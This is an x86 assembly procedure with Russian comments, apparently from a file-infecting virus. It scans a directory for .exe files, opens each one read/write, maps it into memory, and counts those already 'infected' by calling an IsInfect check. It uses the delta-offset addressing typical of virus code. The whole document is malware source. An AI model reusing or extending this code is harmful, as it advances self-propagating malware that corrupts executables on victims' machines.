;===============================================================================;
;NumberOfOurFiles proc Buffer:DWORD,Delta:DWORD
;Описание: Функция проверяет количество файлов на указанном пути
;Вход:
;	Buffer - путь где смотреть файлы
;	Delta - дельта смещение
;===============================================================================;
NumberOfOurFiles proc Buffer:DWORD,Delta:DWORD
LOCAL FindData:WIN32_FIND_DATA
LOCAL LocalBuffer:DWORD
LOCAL hFile:DWORD
LOCAL hMapping:DWORD
LOCAL hMap:DWORD
LOCAL hFind:DWORD
jmp y
	Z	db	"\*.*",0
y:
	startproc
	xor esi,esi
	mov ebx,Delta
;Выделяем буфер
	push ebx
	call AllocBuffer
	mov LocalBuffer,eax
;Копируем путь
	push Buffer
	push eax
	apiproc _lstrcpyA
;Добавляем звезды
	lea eax,[ebx+Z]
	push eax
	push LocalBuffer
	apiproc _lstrcatA
;Начало поиска
	lea eax,FindData
	push eax
	push LocalBuffer
	apiproc _FindFirstFileA
	.if eax==-1
		endproc
		ret
	.endif
	mov hFind,eax
NextFile1:
;Директория?
	mov     eax,FindData.dwFileAttributes                   
	and     eax,FILE_ATTRIBUTE_DIRECTORY
	.if eax==0
;Вычислим длину строки
		lea eax,FindData.cFileName
		push eax
		apiproc _lstrlenA                              
		.if (dword ptr [FindData.cFileName+eax-4]!='exe.')
			.if  (dword ptr [FindData.cFileName+eax-4]!='EXE.')
				jmp NextFile2
			.endif
		.endif
;Вычислим длину строки
		push LocalBuffer
		apiproc _lstrlenA  
;Вычтем *.*
		sub eax,3                                           
;Сохраним полученную длину
		push eax
		mov edx,LocalBuffer
;Формируем путь к файлу
		mov byte ptr [edx+eax],0
		lea eax,FindData.cFileName
		push eax
		push LocalBuffer
		apiproc _lstrcatA
;Открываем файл
		push NULL
		push FILE_ATTRIBUTE_NORMAL
		push OPEN_EXISTING
		push NULL
		push FILE_SHARE_WRITE or FILE_SHARE_READ 
		push GENERIC_WRITE or  GENERIC_READ
		push LocalBuffer
		apiproc _CreateFileA
;Проверка на правильность открытия файла
		.if eax==-1
			jmp EndNumberOfOurFiles
		.endif
		mov hFile,eax
;Создаем объект "проекция файла"
		push NULL
		push NULL
		push NULL
		push PAGE_READWRITE
		push NULL
		push eax
		apiproc _CreateFileMappingA
;Проверка на правильность создания проекции
		.if eax==0
			jmp EndNumberOfOurFiles
		.endif
		mov hMapping,eax
;Проецируем файл на адресное пространство
		push 0
		push 0
		push 0
		push FILE_MAP_ALL_ACCESS
		push eax	
		apiproc _MapViewOfFile
		.if eax==0
			jmp EndNumberOfOurFiles
		.endif
		mov hMap,eax
;Заражен ли файл?
		push hMap
		call IsInfect
		.if eax==1
			inc esi
		.endif
;Закрываем описатели
		push hMapping
		apiproc _CloseHandle
		
		push hMap
		apiproc _UnmapViewOfFile

		push hFile
		apiproc _CloseHandle   		
;Восстановим длину строки		
		pop eax
		mov edx,LocalBuffer
;И восстановим \*.*
		mov     dword ptr [edx+eax-1],'*.*\'
		mov     byte ptr [edx+eax+3],0
	.endif
NextFile2:
;Ищем следующий файл
	lea eax,FindData                                  
	push eax
	push hFind
	apiproc _FindNextFileA
	.if eax!=0
		jmp NextFile1
	.endif
	push hFind
	apiproc _FindClose
EndNumberOfOurFiles:
	push ebx
	push LocalBuffer
	call FreeBuffer

	mov eax,esi
	endproc
	ret
NumberOfOurFiles endp
;===============================================================================;